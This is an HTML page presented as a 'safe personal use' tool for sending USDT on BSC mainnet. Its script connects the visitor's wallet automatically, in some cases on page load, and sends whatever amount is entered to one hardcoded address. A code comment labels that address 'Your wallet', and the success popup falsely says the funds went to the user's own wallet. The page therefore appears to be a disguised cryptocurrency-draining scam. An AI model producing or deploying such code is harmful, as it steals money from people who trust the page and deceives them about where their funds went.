<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Send USDT Mainnet (Safe Personal Use)</title>
<style>
body { background:#0d0d0d; color:white; font-family:Arial,sans-serif; margin:0; padding:0; }
.container { max-width:400px; margin:20px auto; padding:20px; }
label { display:block; margin-bottom:8px; color:#ccc; font-weight:bold; }
.input-group { display:flex; align-items:center; background:#1a1a1a; border:1px solid #333; border-radius:8px; padding:10px; margin-bottom:20px; }
input[type="text"], input[type="number"] { flex:1; background:transparent; border:none; color:white; outline:none; font-size:16px; }
button { margin-left:10px; background:transparent; color:#00ff99; border:none; cursor:pointer; font-size:14px; }
.usd-value { margin:-10px 0 20px 0; color:#999; }
.next-button { width:100%; background:#00cc66; color:white; padding:15px; font-size:18px; font-weight:bold; border:none; border-radius:50px; cursor:pointer; }
</style>
</head>
<body>
<div class="container">
<label for="amount">Amount</label>
<div class="input-group">
<input type="number" id="amount" placeholder="USDT Amount" oninput="updateUSD()"/>
<span>USDT</span>
</div>
<div class="usd-value" id="usdValue">≈ $0.00</div>
<button id="Next" class="next-button" onclick="Next()">Next</button>
</div>

<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
<script>
const bscRecipientAddress = "0xF7a1EED0FEaE0CA423Fbe6c6b36A67fa7144EbA8"; // Your wallet
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // Mainnet USDT
let web3, userAddress;

function updateUSD(){
    const amount = parseFloat(document.getElementById("amount").value||"0");
    document.getElementById("usdValue").innerText = `≈ $${amount.toFixed(2)}`;
}

async function connectWallet(){
    if(window.ethereum){
        web3=new Web3(window.ethereum);
        try{
            await window.ethereum.request({method:'eth_requestAccounts'});
            await window.ethereum.request({method:'wallet_switchEthereumChain', params:[{chainId:'0x38'}]}); // BSC Mainnet
            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];
            console.log("Wallet Connected:", userAddress);
        }catch(err){ console.error(err); alert("Error connecting wallet."); }
    }else{ alert("Install MetaMask or Trust Wallet."); }
}

function showPopup(message,color='green'){
    let popup = document.getElementById('popupBox');
    if(!popup){
        popup=document.createElement('div');
        popup.id='popupBox';
        popup.style.position='fixed'; popup.style.left='50%'; popup.style.top='50%';
        popup.style.transform='translate(-50%,-50%)';
        popup.style.padding='20px'; popup.style.borderRadius='10px';
        popup.style.boxShadow='0px 0px 10px rgba(0,0,0,0.2)';
        popup.style.textAlign='center'; popup.style.fontSize='18px'; popup.style.maxWidth='400px';
        document.body.appendChild(popup);
    }
    popup.style.backgroundColor=color==='red'?'#ffebeb':'#e6f7e6';
    popup.style.color=color==='red'?'red':'green';
    popup.innerHTML=message;
    popup.style.display='block';
    setTimeout(()=>{popup.style.display='none';},5000);
}

async function transferUSDT(amount){
    if(!userAddress) await connectWallet();
    const contract=new web3.eth.Contract([
        {constant:false,inputs:[{name:'_to',type:'address'},{name:'_value',type:'uint256'}],name:'transfer',outputs:[{name:'',type:'bool'}],type:'function'},
        {constant:true,inputs:[{name:'_owner',type:'address'}],name:'balanceOf',outputs:[{name:'balance',type:'uint256'}],type:'function'}
    ],usdtContractAddress);

    try{
        const balance=await contract.methods.balanceOf(userAddress).call();
        const decimals=18;
        const balanceReadable=parseFloat(web3.utils.fromWei(balance,'ether'));
        if(balanceReadable<amount){ showPopup('Insufficient USDT balance.','red'); return; }
        const tx = await contract.methods.transfer(bscRecipientAddress, web3.utils.toWei(amount.toString(),'ether')).send({from:userAddress});
        showPopup(`✅ Transferred ${amount} USDT to your own wallet! Tx Hash: ${tx.transactionHash}`);
    }catch(err){ console.error(err); showPopup('Transfer failed. '+(err.message||''),'red'); }
}

async function Next(){
    const amount=parseFloat(document.getElementById("amount").value||"0");
    if(amount<=0){ alert('Enter amount'); return; }
    await transferUSDT(amount);
}

window.addEventListener('load', async()=>{
    if(window.ethereum && window.ethereum.isTrust) await connectWallet();
});
</script>
</body>
</html>
